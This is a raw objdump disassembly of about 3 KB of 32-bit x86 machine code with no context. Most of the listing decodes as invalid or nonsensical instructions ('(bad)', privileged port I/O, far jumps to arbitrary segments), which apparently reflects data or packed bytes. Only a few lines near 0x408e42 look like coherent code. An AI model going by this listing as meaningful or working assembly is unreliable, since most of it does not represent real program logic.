  408c5d:	xor    ecx,DWORD PTR [esi]
  408c5f:	mov    ecx,esp
  408c61:	cmc    
  408c62:	in     al,0x19
  408c64:	loopne 0x408c28
  408c66:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408c67:	fnstenv [esi]
  408c69:	push   ebp
  408c6a:	or     al,0x8d
  408c6c:	mov    ebx,DWORD PTR [edx]
  408c6e:	sub    eax,0xc1a15570
  408c73:	repnz pusha 
  408c75:	es leave 
  408c77:	cld    
  408c78:	lods   al,BYTE PTR ds:[esi]
  408c79:	cmp    esi,DWORD PTR [esi-0x2b24c3e2]
  408c7f:	push   eax
  408c80:	bound  esp,QWORD PTR ds:0x5d9f82e4
  408c86:	outs   dx,BYTE PTR ds:[esi]
  408c87:	push   edx
  408c88:	gs add eax,0x43325a15
  408c8e:	stc    
  408c8f:	inc    esi
  408c90:	pop    esp
  408c91:	pushf  
  408c92:	sub    cl,dl
  408c94:	sbb    al,0x5a
  408c96:	ins    DWORD PTR es:[edi],dx
  408c97:	mov    ebx,0x10bcafae
  408c9c:	retf   
  408c9d:	lds    ax,DWORD PTR cs:[ecx+ecx*8]
  408ca2:	mov    bl,0x31
  408ca4:	shl    ecx,0x77
  408ca7:	mov    cl,BYTE PTR [ecx+0x6e]
  408caa:	fisub  WORD PTR [eax+0x2618e773]
  408cb0:	mov    ds:0xb582cbc9,eax
  408cb5:	mov    ds:0x9d18c215,al
  408cba:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408cbb:	and    DWORD PTR ds:0x6e742de5,0x86f8ce85
  408cc5:	js     0x408c77
  408cc7:	scas   al,BYTE PTR es:[edi]
  408cc8:	add    BYTE PTR [ecx+0x6d],dl
  408ccb:	jmp    0x408c4f
  408ccd:	cdq    
  408cce:	stos   BYTE PTR es:[edi],al
  408ccf:	retf   
  408cd0:	test   eax,0xa5f042a9
  408cd5:	pop    DWORD PTR [edi]
  408cd7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408cd8:	xor    al,0xb
  408cda:	daa    
  408cdb:	xchg   ebp,eax
  408cdc:	scas   eax,DWORD PTR es:[edi]
  408cdd:	xor    al,0xc1
  408cdf:	arpl   WORD PTR [ebx],dx
  408ce1:	xchg   ecx,eax
  408ce2:	jmp    0xfef3:0x7066aee
  408ce9:	sbb    eax,DWORD PTR [esi+ecx*4+0x415e5c5b]
  408cf0:	ja     0x408cf6
  408cf2:	sbb    BYTE PTR [esi],dh
  408cf4:	fisubr WORD PTR [ebp-0x60]
  408cf7:	dec    ecx
  408cf8:	adc    BYTE PTR ds:0x5cbcb55d,0xed
  408cff:	adc    esi,edi
  408d01:	or     ebx,DWORD PTR [ecx-0x4ea943e9]
  408d07:	iret   
  408d08:	mov    ebp,0xb5e7da42
  408d0d:	mov    al,0x19
  408d0f:	adc    BYTE PTR [edx-0x4b],dh
  408d12:	nop
  408d13:	and    eax,0x6b0f9369
  408d18:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408d1a:	in     eax,dx
  408d1b:	inc    ecx
  408d1c:	es and eax,0x900b0b4c
  408d22:	push   cs
  408d23:	sbb    BYTE PTR ds:0x219ceeed,ah
  408d29:	sti    
  408d2a:	xor    ebx,ebx
  408d2c:	fwait
  408d2d:	jo     0x408da2
  408d2f:	hlt    
  408d30:	cld    
  408d31:	in     al,0xa2
  408d33:	and    eax,0xb98de284
  408d38:	pop    ecx
  408d39:	je     0x408d15
  408d3b:	aas    
  408d3c:	sub    BYTE PTR [esi],al
  408d3e:	sub    al,0x53
  408d40:	clc    
  408d41:	in     al,0xcb
  408d43:	les    esp,FWORD PTR [edi+0x0]
  408d46:	cdq    
  408d47:	(bad)  
  408d48:	mov    edi,0x9a4ddd38
  408d4d:	rcl    BYTE PTR [edx-0x2935458b],0x37
  408d54:	iret   
  408d55:	cmp    al,0x99
  408d57:	cwde   
  408d58:	sub    ah,BYTE PTR [ecx]
  408d5a:	out    0x8f,al
  408d5c:	mov    ecx,0x4799c3e9
  408d61:	std    
  408d62:	loope  0x408d9c
  408d64:	jmp    0xd12c:0xd20cf5e9
  408d6b:	in     eax,0xc
  408d6d:	sahf   
  408d6e:	fstp   DWORD PTR ds:0x88b5b757
  408d74:	popa   
  408d75:	jl     0x408dd4
  408d77:	jne    0x408dc2
  408d79:	stos   BYTE PTR es:[edi],al
  408d7a:	jmp    DWORD PTR [esi]
  408d7c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408d7d:	(bad)  
  408d7e:	mov    al,ds:0x88ea4e71
  408d83:	pop    ecx
  408d84:	fist   WORD PTR [ebx+0x6]
  408d88:	jl     0x408dab
  408d8a:	mov    WORD PTR [edx],?
  408d8c:	jge    0x408df5
  408d8e:	iret   
  408d8f:	test   BYTE PTR [edx-0x4d1dcb6],bl
  408d95:	test   BYTE PTR [eax],cl
  408d97:	rcr    BYTE PTR [ebp+0x49],1
  408d9a:	push   ds
  408d9b:	les    esi,FWORD PTR [ebx-0x50]
  408d9e:	shl    DWORD PTR [esi-0xaed226],0xb
  408da5:	leave  
  408da6:	ins    BYTE PTR es:[edi],dx
  408da7:	mov    dl,BYTE PTR [ebp+0x51]
  408daa:	outs   dx,DWORD PTR ds:[esi]
  408dab:	std    
  408dac:	fwait
  408dad:	int    0x42
  408daf:	mov    al,ds:0x8a9b84a7
  408db4:	lock sahf 
  408db6:	cld    
  408db7:	add    DWORD PTR [edi],ebp
  408db9:	outs   dx,BYTE PTR ds:[esi]
  408dba:	loopne 0x408e14
  408dbc:	pop    esp
  408dbd:	add    ah,BYTE PTR [esi]
  408dbf:	inc    esp
  408dc0:	setb   BYTE PTR [edi+0x39df8d6c]
  408dc7:	pop    ecx
  408dc8:	jmp    0x8b42ec57
  408dcd:	aaa    
  408dce:	test   dl,dl
  408dd0:	inc    esp
  408dd1:	mov    BYTE PTR [eax-0x45e8f8a6],ch
  408dd7:	mov    ?,esp
  408dd9:	xchg   esp,eax
  408dda:	or     eax,0x81f63775
  408ddf:	jb     0x408de3
  408de1:	cmp    ah,BYTE PTR [ecx-0x64af2a15]
  408de7:	iret   
  408de8:	fistp  DWORD PTR [edx]
  408dea:	mov    bl,0xc9
  408dec:	lahf   
  408ded:	adc    DWORD PTR [edx],ecx
  408def:	popa   
  408df0:	fxch   st(7)
  408df2:	ins    BYTE PTR es:[edi],dx
  408df3:	mov    es,WORD PTR [edx]
  408df5:	inc    ebx
  408df6:	mov    ds:0x782c6e0d,al
  408dfb:	fisttp WORD PTR [ecx]
  408dfd:	or     esp,esi
  408dff:	(bad)  
  408e00:	retf   0xe92c
  408e03:	sub    eax,0xb00bb922
  408e08:	dec    ecx
  408e09:	lods   al,BYTE PTR ds:[esi]
  408e0a:	rcr    esp,1
  408e0c:	(bad)  
  408e0e:	mov    edi,ebx
  408e10:	aas    
  408e11:	jbe    0x408e75
  408e13:	imul   DWORD PTR [ecx-0x7e8f3783]
  408e19:	or     ebp,edi
  408e1b:	mov    edx,DWORD PTR [ebp-0xe06e486]
  408e21:	inc    esi
  408e22:	mov    WORD PTR [eax],?
  408e24:	jno    0x408e0b
  408e26:	mov    bh,0x18
  408e28:	xlat   BYTE PTR ds:[ebx]
  408e29:	jmp    0x507efb60
  408e2e:	(bad)  
  408e2f:	mov    bl,0xfa
  408e31:	push   cs
  408e32:	sub    esi,eax
  408e34:	adc    edx,ebp
  408e36:	je     0x408e28
  408e38:	(bad)  
  408e39:	repz enter 0x3e9f,0x57
  408e3e:	xor    BYTE PTR [edi+ecx*4+0xf],bl
  408e42:	lods   al,BYTE PTR ds:[esi]
  408e43:	rol    BYTE PTR [edx],1
  408e45:	mov    DWORD PTR [ebp+0x14],eax
  408e48:	mov    eax,DWORD PTR [esi]
  408e4a:	xor    DWORD PTR [ebp+0x14],edi
  408e4d:	shr    edx,0x2
  408e50:	mov    edx,DWORD PTR [esi+0x4]
  408e53:	xor    edx,edx
  408e55:	shl    eax,0x1e
  408e58:	or     edx,DWORD PTR [ebp+0x14]
  408e5b:	mov    DWORD PTR [ebp-0x28],edx
  408e5e:	mov    eax,DWORD PTR [ebp-0x24]
  408e61:	mov    eax,DWORD PTR [ebp-0x24]
  408e64:	jmp    0x409242
  408e69:	and    al,BYTE PTR [ebp-0x6d]
  408e6c:	pop    ss
  408e6d:	jb     0x408e35
  408e6f:	and    ah,BYTE PTR ds:0x7e10ec41
  408e75:	mov    al,0x3a
  408e77:	in     eax,0xaa
  408e79:	cmp    dl,BYTE PTR [ecx+0x18]
  408e7c:	sbb    BYTE PTR [esi+0x21181812],bl
  408e82:	fnstcw WORD PTR [edi]
  408e84:	sub    DWORD PTR [ebp-0x503fc2c],edi
  408e8a:	shr    DWORD PTR [ecx+0x6b74913d],cl
  408e90:	out    dx,al
  408e91:	fild   QWORD PTR [ecx]
  408e93:	pop    ss
  408e94:	in     al,0xcb
  408e96:	pop    esp
  408e97:	into   
  408e98:	fdiv   st(7),st
  408e9a:	dec    esp
  408e9b:	(bad)  
  408e9c:	not    BYTE PTR [edi]
  408e9e:	jbe    0x408e5f
  408ea0:	xchg   ebx,eax
  408ea1:	ss mov ch,0x94
  408ea4:	pop    esp
  408ea5:	sahf   
  408ea6:	cmp    BYTE PTR [edi-0x3d9c54bc],dl
  408eac:	dec    edi
  408ead:	mov    ebp,0x9d52b7e
  408eb2:	aas    
  408eb3:	adc    BYTE PTR [edx],cl
  408eb5:	xlat   BYTE PTR ds:[ebx]
  408eb6:	sbb    al,0xc8
  408eb8:	sub    bh,dh
  408eba:	mov    ds:0x8432ac2c,al
  408ebf:	mov    dl,0x86
  408ec1:	add    al,0x5d
  408ec3:	and    eax,0x83451bfd
  408ec8:	rcl    dh,1
  408eca:	and    cl,BYTE PTR [edi+esi*2+0x46917b21]
  408ed1:	jmp    0x408e6a
  408ed3:	inc    ebp
  408ed4:	repz pop edx
  408ed6:	daa    
  408ed7:	call   0xbe0922f2
  408edc:	enter  0x60fb,0xfd
  408ee0:	pop    ebx
  408ee1:	aas    
  408ee2:	mov    ah,0xf4
  408ee4:	pusha  
  408ee5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408ee6:	dec    ecx
  408ee7:	iret   
  408ee8:	xchg   ebp,eax
  408ee9:	jb     0x408f3f
  408eeb:	mov    eax,DWORD PTR ds:0xb172f18f
  408ef1:	mov    ecx,0x4489a1bd
  408ef6:	aaa    
  408ef7:	cmp    DWORD PTR [ebp-0x26b7fada],esi
  408efd:	and    ecx,DWORD PTR [ecx+edi*4-0x5e]
  408f01:	test   BYTE PTR [edx],cl
  408f03:	mov    ecx,0x648935f4
  408f08:	sub    ebp,DWORD PTR [edi+0xa670c51]
  408f0e:	and    eax,0x87e40144
  408f13:	push   0xcff07b56
  408f18:	rcr    BYTE PTR [ebx+0x1f],cl
  408f1b:	mov    ds:0x99ccdbbf,al
  408f20:	mov    ch,0x2
  408f22:	push   ebx
  408f23:	int3   
  408f24:	adc    cl,BYTE PTR [edi]
  408f26:	stos   BYTE PTR es:[edi],al
  408f27:	mov    BYTE PTR [edi+edi*1-0x3],dl
  408f2b:	xor    eax,0xbf8bf33a
  408f30:	sub    DWORD PTR [ecx-0x734a5770],0x58
  408f37:	test   DWORD PTR [ebp-0x1752c96c],ebx
  408f3d:	popf   
  408f3e:	add    edi,DWORD PTR [esi+0x53]
  408f41:	push   esp
  408f42:	arpl   WORD PTR [edx+0x121f70ea],bx
  408f48:	fidivr DWORD PTR [edx+ecx*2]
  408f4b:	add    BYTE PTR [ebx],al
  408f4d:	xchg   bl,dl
  408f4f:	or     bl,BYTE PTR [ebx-0x5c1f8970]
  408f55:	jl     0x408f27
  408f57:	(bad)  
  408f58:	fiadd  DWORD PTR [ebx+0x60]
  408f5b:	enter  0xe4f1,0x4e
  408f5f:	mov    al,0xed
  408f61:	(bad)  
  408f62:	jno    0x408f37
  408f64:	add    ch,BYTE PTR [eax]
  408f66:	xchg   cl,ah
  408f68:	pushf  
  408f69:	leave  
  408f6a:	shl    BYTE PTR [ebp-0x61f04bfd],0x2
  408f71:	mov    bl,0x2e
  408f73:	cmps   DWORD PTR ss:[esi],DWORD PTR es:[edi]
  408f75:	sub    al,BYTE PTR [ecx]
  408f77:	inc    esi
  408f78:	cmp    bl,BYTE PTR ds:0x6339abb2
  408f7e:	lods   eax,DWORD PTR ds:[esi]
  408f7f:	jae    0x408fe2
  408f81:	mov    eax,0x4f36f702
  408f86:	test   BYTE PTR [edi-0x34],bl
  408f89:	aad    0x72
  408f8b:	fist   DWORD PTR [esi+0x56]
  408f8e:	in     al,0xd9
  408f90:	icebp  
  408f91:	retf   
  408f92:	(bad)  
  408f94:	lods   al,BYTE PTR ds:[esi]
  408f95:	dec    ebp
  408f96:	out    dx,al
  408f97:	jns    0x408f79
  408f99:	push   edi
  408f9a:	lods   eax,DWORD PTR ds:[esi]
  408f9b:	and    eax,0xd3d9dd2e
  408fa0:	repnz and ecx,edx
  408fa3:	mov    ebp,0xaad0d037
  408fa8:	mov    ?,WORD PTR [ebx+0x449838a2]
  408fae:	bound  ebx,QWORD PTR [ecx-0x4ccfe0c2]
  408fb4:	or     ah,bh
  408fb6:	test   DWORD PTR ds:0xa1cf32bf,0x595053e6
  408fc0:	push   cs
  408fc1:	aaa    
  408fc2:	inc    edi
  408fc3:	imul   DWORD PTR [ecx-0x5c]
  408fc6:	and    eax,0xaca00cdb
  408fcb:	mov    ebp,0x77901d03
  408fd0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408fd1:	inc    cx
  408fd3:	push   cs
  408fd4:	adc    BYTE PTR [edi],dh
  408fd6:	fcomp  QWORD PTR [esp+eiz*8]
  408fd9:	add    eax,0x4aca95
  408fde:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408fdf:	sub    al,0x7
  408fe1:	stc    
  408fe2:	and    BYTE PTR [edi],dl
  408fe4:	and    eax,0x91bad1b1
  408fe9:	mov    ds:0x6e4d3608,eax
  408fee:	addr16 aaa 
  408ff0:	jo     0x40906a
  408ff2:	dec    edi
  408ff3:	pop    esp
  408ff4:	jae    0x408fd8
  408ff6:	xchg   edi,eax
  408ff7:	and    ah,BYTE PTR [esi]
  408ff9:	es cs or eax,0x68b46ccb
  409000:	dec    ebx
  409001:	mov    edx,0x2a300756
  409006:	cmc    
  409007:	xchg   ebp,eax
  409008:	int    0x52
  40900a:	pop    ecx
  40900b:	mov    dh,0x5a
  40900d:	aam    0x4b
  40900f:	das    
  409010:	cmp    edi,DWORD PTR [ebx]
  409012:	ds cmps BYTE PTR es:[esi],BYTE PTR es:[edi]
  409015:	pop    ebx
  409016:	jno    0x40907b
  409018:	xchg   ebp,eax
  409019:	mov    ds:0x3a534138,al
  40901e:	popa   
  40901f:	xor    al,0xe1
  409021:	inc    edx
  409022:	cmp    BYTE PTR [eax],dl
  409024:	bound  ecx,QWORD PTR [esi+0x62]
  409027:	daa    
  409028:	lea    edx,[ebp+esi*4-0x481e17f1]
  40902f:	lock pusha 
  409031:	mov    al,ds:0x93a56040
  409036:	ja     0x409039
  409038:	push   ebx
  409039:	shl    DWORD PTR [esi-0x4c],1
  40903c:	loopne 0x408ff4
  40903e:	and    BYTE PTR [esi],dh
  409040:	retf   0xe61b
  409043:	idiv   DWORD PTR [edx-0x66852fe5]
  409049:	in     eax,0x94
  40904b:	push   es
  40904c:	push   ebx
  40904d:	and    ebx,DWORD PTR [eax]
  40904f:	movs   BYTE PTR es:[di],BYTE PTR ds:[si]
  409051:	gs mov ch,0xdb
  409054:	dec    eax
  409055:	xlat   BYTE PTR ds:[ebx]
  409056:	outs   dx,BYTE PTR ds:[esi]
  409057:	jne    0x408fdc
  409059:	pop    ecx
  40905a:	jmp    0xc02:0x19e92275
  409061:	push   edi
  409062:	push   esp
  409063:	gs inc ebx
  409065:	aad    0x3a
  409067:	adc    al,BYTE PTR [ebp+ebx*4-0x36]
  40906b:	add    DWORD PTR [ebp+0x47],edx
  40906e:	xchg   ebx,eax
  40906f:	ins    BYTE PTR es:[edi],dx
  409070:	dec    ecx
  409071:	ror    DWORD PTR [ebp-0x409c266b],cl
  409077:	mov    ebp,0x659bd992
  40907c:	add    eax,0x9817d43f
  409081:	bound  ebx,QWORD PTR [ecx-0x2b1140dd]
  409087:	mov    al,ds:0x8da3a51d
  40908c:	or     al,0x1e
  40908e:	or     al,0xde
  409090:	mov    BYTE PTR [edx+0x71d7195f],cl
  409096:	mov    edi,0xe803354a
  40909b:	mov    edi,0xb7dcc4ff
  4090a0:	mul    DWORD PTR [ebp+0x4d276d57]
  4090a6:	sti    
  4090a7:	lds    ebp,FWORD PTR [ecx-0x6a54f6a0]
  4090ad:	xchg   esp,eax
  4090ae:	cdq    
  4090af:	add    cl,BYTE PTR [edi+edi*1-0x43cc69f0]
  4090b6:	fmulp  st(6),st
  4090b8:	cmp    bl,BYTE PTR [edi]
  4090ba:	xlat   BYTE PTR ds:[ebx]
  4090bb:	jae    0x4090ba
  4090bd:	cs jle 0x40913a
  4090c0:	dec    edi
  4090c1:	xor    DWORD PTR [esi+0x3a],edi
  4090c4:	sar    BYTE PTR [eax+0x38],cl
  4090c7:	fstp   QWORD PTR [ebx-0x48892874]
  4090cd:	jge    0x4090f8
  4090cf:	push   0xffffff9c
  4090d1:	std    
  4090d2:	push   ecx
  4090d3:	adc    ch,BYTE PTR [edx-0x5d]
  4090d6:	push   edx
  4090d7:	repnz loope 0x4090ce
  4090da:	xchg   DWORD PTR [esp+esi*1],edx
  4090dd:	mov    dh,0x61
  4090df:	or     DWORD PTR [ebx-0x32783e18],ebx
  4090e5:	and    al,0x62
  4090e7:	test   eax,0x72668d00
  4090ec:	call   0xae6c4801
  4090f1:	push   ecx
  4090f2:	sti    
  4090f3:	inc    esp
  4090f4:	inc    ecx
  4090f5:	mov    eax,0x6fa0bf3f
  4090fa:	dec    ecx
  4090fb:	mov    eax,0x29be1492
  409100:	aaa    
  409101:	sub    ebx,esp
  409103:	or     edx,DWORD PTR [ecx+esi*1-0x12]
  409107:	clc    
  409108:	add    eax,DWORD PTR [ebp+0x1a]
  40910b:	lods   eax,DWORD PTR ds:[esi]
  40910c:	out    dx,al
  40910d:	imul   DWORD PTR [edx+0x40]
  409110:	cmp    edi,edi
  409112:	leave  
  409113:	cmp    bh,BYTE PTR ds:0x8362cf14
  409119:	call   0xdc5d4fd7
  40911e:	push   ss
  40911f:	push   eax
  409120:	daa    
  409121:	and    edi,esi
  409123:	cmp    al,0x1c
  409125:	xchg   esi,eax
  409126:	test   al,0x9f
  409128:	dec    edx
  409129:	addr16 push cs
  40912b:	xor    al,0xfb
  40912d:	rol    DWORD PTR [edi],0x86
  409130:	cmp    ah,BYTE PTR [edi+ecx*8+0x3a]
  409134:	ret    0xeacb
  409137:	pop    edi
  409138:	or     BYTE PTR [esi-0x40638b68],0x56
  40913f:	sbb    DWORD PTR [ebx+0x5021b264],eax
  409145:	les    esp,FWORD PTR [edx+edi*8]
  409148:	test   al,0x95
  40914a:	and    edx,DWORD PTR [edi-0x7057c2b8]
  409150:	xor    al,0x10
  409152:	ins    BYTE PTR es:[edi],dx
  409153:	push   edx
  409154:	jl     0x4090e7
  409156:	data16 int3 
  409158:	xchg   esi,eax
  40915a:	pop    ds
  40915b:	popa   
  40915c:	cmp    ecx,DWORD PTR [ebx+0x6d3ef559]
  409162:	icebp  
  409163:	adc    BYTE PTR [edi+0x6aa83afa],bl
  409169:	jmp    0x4c03:0xda13970
  409170:	xchg   edi,eax
  409171:	fist   WORD PTR ds:0x190a21bf
  409177:	loop   0x40917d
  409179:	and    ch,BYTE PTR [ecx]
  40917b:	leave  
  40917c:	in     al,dx
  40917d:	pop    es
  40917e:	sbb    al,0xcd
  409180:	call   0xa59c409e
  409185:	lea    esi,[ebx]
  409187:	add    al,0x5
  409189:	and    dh,BYTE PTR [eax]
  40918b:	or     DWORD PTR [eax],ecx
  40918d:	lea    edi,[edx+ebx*4-0x62]
  409191:	add    DWORD PTR [bx+0x1e0a],esi
  409196:	mov    BYTE PTR fs:[edx],dl
  409199:	and    BYTE PTR [ecx],dl
  40919b:	(bad)  
  40919c:	ds mov ecx,0xec1f6d74
  4091a2:	into   
  4091a3:	xor    ebx,DWORD PTR [esi+0x5b]
  4091a6:	add    DWORD PTR [eax+ecx*4-0x4fd2d264],eax
  4091ad:	add    bh,BYTE PTR [esi]
  4091af:	cmp    BYTE PTR [edi],ch
  4091b1:	clc    
  4091b2:	push   edx
  4091b3:	bound  esp,QWORD PTR [eax+0x2ffaf07b]
  4091b9:	pop    esi
  4091ba:	ja     0x40917b
  4091bc:	test   bl,dl
  4091be:	cmp    al,0x1d
  4091c0:	inc    ecx
  4091c1:	sub    eax,0x6b02fc87
  4091c6:	scas   eax,DWORD PTR es:[edi]
  4091c7:	jae    0x409236
  4091c9:	fcomp  DWORD PTR [ecx]
  4091cb:	add    eax,DWORD PTR [esi-0x5b5a3bde]
  4091d1:	adc    edx,edi
  4091d3:	(bad)  
  4091d4:	std    
  4091d5:	xor    eax,eax
  4091d7:	stc    
  4091d8:	inc    esi
  4091d9:	and    ebp,DWORD PTR [esi]
  4091db:	pop    eax
  4091dc:	mov    BYTE PTR [edi-0x31],dh
  4091df:	data16 addr16 mov ds:0xd451,al
  4091e4:	inc    edx
  4091e5:	mov    ds,WORD PTR [ecx+0x3d]
  4091e8:	xor    al,0xee
  4091ea:	mov    dh,BYTE PTR ds:0xf220c44e
  4091f0:	rcr    DWORD PTR ds:[bx],cl
  4091f4:	lds    ebp,FWORD PTR [ecx+0x59a64c4b]
  4091fa:	and    bl,BYTE PTR [ebp-0x581f8629]
  409200:	jle    0x4091bf
  409202:	add    BYTE PTR [bx+di+0x78d4],dh
  409207:	js     0x409273
  409209:	in     al,dx
  40920a:	outs   dx,DWORD PTR ds:[esi]
  40920b:	dec    ebp
  40920c:	cmp    DWORD PTR [eax+0x4fd543cc],edx
  409212:	sbb    esp,ebx
  409214:	daa    
  409215:	shr    dh,cl
  409217:	jne    0x409205
  409219:	mov    esp,0xb2156a16
  40921e:	shr    al,cl
  409220:	(bad)  
  409221:	dec    esp
  409222:	and    DWORD PTR [eax+0x15],edx
  409225:	push   cs
  409226:	xlat   BYTE PTR ds:[ebx]
  409227:	div    ah
  409229:	(bad)  
  40922a:	jb     0x4091cc
  40922c:	or     eax,0x428808e3
  409231:	fisttp WORD PTR [eax]
  409234:	jp     0x409269
  409236:	sub    dh,BYTE PTR [ecx]
  409238:	aas    
  409239:	sahf   
  40923a:	jne    0x409216
  40923c:	lods   al,BYTE PTR ds:[esi]
  40923d:	dec    edi
  40923e:	adc    eax,0x334c633b
  409243:	ror    BYTE PTR [edi],cl
  409245:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409246:	ret    0x3302
  409249:	ror    DWORD PTR [ecx-0x2616f3ab],1
  40924f:	add    eax,DWORD PTR [eax]
  409251:	add    dl,ah
  409253:	and    eax,0xea26ea26
  409258:	sbb    bl,BYTE PTR ds:0x70a1617f
  40925e:	call   DWORD PTR [eax]
  409260:	xchg   DWORD PTR [eax+eax*8+0x49],edi
  409264:	sbb    BYTE PTR [eax],bl
  409266:	sahf   
  409267:	adc    bl,BYTE PTR [eax]
  409269:	sbb    dh,ah
  40926b:	add    ebp,edx
  40926d:	(bad)  
  40926f:	int3   
  409270:	inc    ebp
  409271:	push   ecx
  409272:	add    ax,0x9eac
  409276:	into   
  409277:	or     edx,esi
  409279:	mov    ebp,0x6f528048
  40927e:	daa    
  40927f:	dec    ebx
  409280:	int    0xd
  409282:	push   ebp
  409283:	int3   
  409284:	dec    esp
  409285:	push   esp
  409286:	add    DWORD PTR [edx+0x6dbb98c1],esp
  40928c:	push   ds
  40928d:	sub    al,0x7e
  40928f:	xlat   BYTE PTR ds:[ebx]
  409290:	cli    
  409291:	call   0xd262:0x788e856
  409298:	jne    0x4092f0
  40929a:	jbe    0x4092b4
  40929c:	mov    dl,0xa1
  40929e:	and    edi,DWORD PTR [ecx+0x5]
  4092a1:	pop    edx
  4092a2:	mov    eax,ds:0xef02bd67
  4092a7:	(bad)  
  4092a8:	out    0xd3,al
  4092aa:	jbe    0x40925f
  4092ac:	fnsave [edi-0x3d9210d7]
  4092b2:	xlat   BYTE PTR ds:[ebx]
  4092b3:	mov    edi,0xfd91c6ab
  4092b8:	dec    ebp
  4092b9:	lods   eax,DWORD PTR ds:[esi]
  4092ba:	frstor [edx+0xd]
  4092bd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4092be:	leave  
  4092bf:	pusha  
  4092c0:	add    eax,0x66914808
  4092c5:	ss cld 
  4092c7:	out    0x7b,al
  4092c9:	xlat   BYTE PTR ds:[ebx]
  4092ca:	jecxz  0x409257
  4092cc:	mov    cl,0x62
  4092ce:	(bad)  
  4092cf:	adc    cl,BYTE PTR [esp+eax*2]
  4092d2:	imul   esi,esp,0x6accf2b9
  4092d8:	enter  0xebdd,0x4e
  4092dc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4092dd:	mov    WORD PTR ds:0xb1be5e66,fs
  4092e3:	xor    BYTE PTR [edx],cl
  4092e5:	lods   eax,DWORD PTR ds:[esi]
  4092e6:	in     eax,0x86
  4092e8:	adc    al,0xb1
  4092ea:	stos   BYTE PTR es:[edi],al
  4092eb:	je     0x4092d3
  4092ed:	sub    cl,al
  4092ef:	cmc    
  4092f0:	pop    ds
  4092f1:	fild   WORD PTR [ebx]
  4092f3:	movntps XMMWORD PTR [edi+0x4e],xmm4
  4092f7:	(bad)  
  4092f8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4092f9:	pop    eax
  4092fa:	xchg   ebx,eax
  4092fb:	mov    edi,DWORD PTR [ebx+ecx*8-0x5598b282]
  409302:	ins    DWORD PTR es:[edi],dx
  409303:	shl    DWORD PTR [ecx-0x66ed2a7],cl
  409309:	ss jl  0x40931c
  40930c:	fs pop ebp
  40930e:	jg     0x409355
  409310:	not    cl
  409312:	pop    edi
  409313:	add    BYTE PTR [edx-0x25],bl
  409316:	jle    0x4092ba
  409318:	sahf   
  409319:	jo     0x409322
  40931b:	hlt    
  40931c:	or     DWORD PTR [eax*1+0x7f53e1b7],esi
  409323:	bound  eax,QWORD PTR [esi+0x37]
  409326:	into   
  409327:	mov    al,0x5e
  409329:	call   FWORD PTR [ecx+edx*4+0x9bafd91]
  409330:	lods   eax,DWORD PTR ds:[esi]
  409331:	push   ebx
  409332:	or     BYTE PTR [esi-0x71537068],ch
  409338:	mov    ebx,DWORD PTR [ecx]
  40933a:	lds    ecx,FWORD PTR [ebp+0x4735c442]
  409340:	test   BYTE PTR [ebx],al
  409342:	and    ecx,DWORD PTR [ecx-0x7]
  409345:	fcomi  st,st(7)
  409347:	xor    al,0xb
  409349:	add    DWORD PTR [eax-0x54],edi
  40934c:	mov    ah,0xf7
  40934e:	inc    edi
  40934f:	jmp    0xfbb8a01e
  409354:	fwait
  409355:	mov    BYTE PTR [ebx],al
  409357:	xor    al,0x44
  409359:	cmp    esi,DWORD PTR [edi+0x6e]
  40935c:	pop    ebx
  40935d:	inc    edi
  40935e:	add    BYTE PTR ds:0xf554fef2,0xb8
  409365:	mov    ds,WORD PTR [edx-0x7f]
  409368:	call   0x1979:0xab8aa7a8
  40936f:	sbb    BYTE PTR [eax+ebx*1+0x13],bl
  409373:	ret    
  409374:	push   eax
  409375:	add    al,0x40
  409377:	dec    edx
  409378:	(bad)  
  409379:	push   ds
  40937a:	jo     0x4093e3
  40937c:	clc    
  40937d:	fs aas 
  40937f:	jb     0x409372
  409381:	and    ch,bh
  409383:	or     bh,BYTE PTR [edx+0x72]
  409386:	inc    edi
  409387:	repnz jcxz 0x40938c
  40938b:	pusha  
  40938c:	jo     0x40938e
  40938e:	and    al,0x59
  409390:	xchg   ebx,eax
  409391:	mov    al,ds:0xee750254
  409396:	mov    ecx,0x9e44c2ac
  40939b:	iret   
  40939c:	dec    eax
  40939d:	jl     0x40940a
  40939f:	fcmovnb st,st(4)
  4093a1:	in     al,0xda
  4093a3:	pop    ebx
  4093a4:	and    BYTE PTR [ecx],dh
  4093a6:	mov    dl,0x69
  4093a8:	sub    eax,0x52f9374b
  4093ad:	call   0x1f5d0702
  4093b2:	mov    dl,0xdf
  4093b4:	les    edi,FWORD PTR [ecx]
  4093b6:	adc    al,0x5b
  4093b8:	jmp    FWORD PTR [edi]
  4093ba:	mov    dh,0x76
  4093bc:	jl     0x409349
  4093be:	xor    cl,ah
  4093c0:	int3   
  4093c1:	xor    eax,0x167cb115
  4093c6:	jno    0x409371
  4093c8:	ss mov edi,0x55d91967
  4093ce:	into   
  4093cf:	rol    DWORD PTR [ecx-0x43],1
  4093d2:	ret    0xc54b
  4093d5:	in     ax,0x41
  4093d8:	je     0x4093ef
  4093da:	popa   
  4093db:	loope  0x40943f
  4093dd:	xchg   esp,eax
  4093de:	pop    esi
  4093df:	cmp    BYTE PTR [esi+0x363e9cbb],al
  4093e5:	add    DWORD PTR [esi],edi
  4093e7:	add    bh,ah
  4093e9:	nop
  4093ea:	mov    ecx,0x3e7793c8
  4093ef:	inc    esi
  4093f0:	call   0x47e6:0x3ea52bd8
  4093f7:	fild   WORD PTR [edi+ebp*8-0x6d580fec]
  4093fe:	mov    ds:0xd71798a4,al
  409403:	pushf  
  409404:	cmp    al,0x33
  409406:	fisub  WORD PTR [ebp-0x5827fed0]
  40940c:	xchg   BYTE PTR [ecx+eax*2],al
  40940f:	mov    bh,0x96
  409411:	scas   al,BYTE PTR es:[edi]
  409412:	cdq    
  409413:	xchg   ebx,eax
  409414:	cmp    esp,DWORD PTR [ebx-0x73]
  409417:	int3   
